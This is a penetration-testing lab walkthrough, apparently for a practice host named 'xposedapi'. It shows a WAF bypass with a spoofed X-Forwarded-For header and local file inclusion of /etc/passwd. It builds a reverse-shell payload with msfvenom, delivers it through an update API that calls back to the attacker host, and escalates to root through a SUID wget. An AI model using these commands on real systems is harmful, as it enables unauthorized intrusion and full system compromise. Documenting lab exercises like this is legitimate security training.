## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.156.134
# HOSTNAME                                         // Found post initial foothold
xposedapi
# OPERATING SYSTEM                                 // Found post initial foothold
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
13337/tcp open  http    syn-ack ttl 61 Gunicorn 20.0.4
```
# ENUMERATION
## PORT 13337
```bash
sudo whatweb $url | sed 's/,/\n/g'

- HTTPServer [gunicorn/20.0.4]
- Title [Remote Software Management API]

- Shows

Usage:
/
Methods: GET
Returns this page.

/version
Methods: GET
Returns version of the app running.

/update
Methods: POST
Updates the app using a linux executable. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}

/logs
Methods: GET
Read log files.

/restart
Methods: GET
To request the restart of the app.

- Using burpsuite
- Checking /logs show
	- WAF: Access Denied for this Host.
- Checking /update using post method 
	- Requires username to update

- Bypass WAF
- Reference https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c

- Adding X-Forwarded-For: 127.0.0.1 to the GET /logs request
- Response
Error! No file specified. Use file=/path/to/log/file to access log files.

- Changing the request
GET /logs?file=/etc/passwd HTTP/1.1

- LFI WORKS 
- Found username
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh

- username:clumsyadmin

- Now try to update the api 
```
## INITIAL FOOTHOLD
```bash
- Create reverse shell payload
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=13337 -f elf -o shell
- Host on port 80

- POST REQUEST
POST /update HTTP/1.1
Host: 192.168.156.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 61

{"user":"clumsyadmin", "url":"http://192.168.45.152/shell"}

sudo python3 -m http.server 80
192.168.156.134 - - [11/Dec/2024 07:11:14] "GET /shell HTTP/1.1" 200 -


- Response
Update requested by clumsyadmin. Restart the software for changes to take effect.

Access - http://192.168.156.134:13337/restart

sudo nc -nvlp 13337
- Didin't work :( 

- Trying to Intercept the traffic request for http://192.168.156.134:13337/restart
- Adding X-Forwarded-For: 127.0.0.1 and change the Request method to POST
- Restart Successful.

sudo nc -nvlp 13337
connect to [192.168.45.152] from (UNKNOWN) [192.168.156.134] 58442
id
uid=1000(clumsyadmin) gid=1000(clumsyadmin) groups=1000(clumsyadmin)

```
## PRIVILEGE ESCALATION
```bash
# SUID
clumsyadmin@xposedapi:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/wget

# GTFOBINS
clumsyadmin@xposedapi:/tmp$ TF=$(mktemp)
clumsyadmin@xposedapi:/tmp$ chmod +x $TF
clumsyadmin@xposedapi:/tmp$ echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
clumsyadmin@xposedapi:/tmp$ /usr/bin/wget
wget: missing URL
Usage: wget [OPTION]... [URL]...

Try `wget --help' for more options.
clumsyadmin@xposedapi:/tmp$ /usr/bin/wget --use-askpass=$TF 0
# id
uid=1000(clumsyadmin) gid=1000(clumsyadmin) euid=0(root) groups=1000(clumsyadmin)
# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Wed Dec 11 06:36:05 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.156.134
Nmap scan report for 192.168.156.134
Host is up, received reset ttl 61 (0.037s latency).
Scanned at 2024-12-11 06:36:07 IST for 21s
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
13337/tcp open  http    syn-ack ttl 61 Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Remote Software Management API
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 11 06:36:28 2024 -- 1 IP address (1 host up) scanned in 23.71 seconds

```

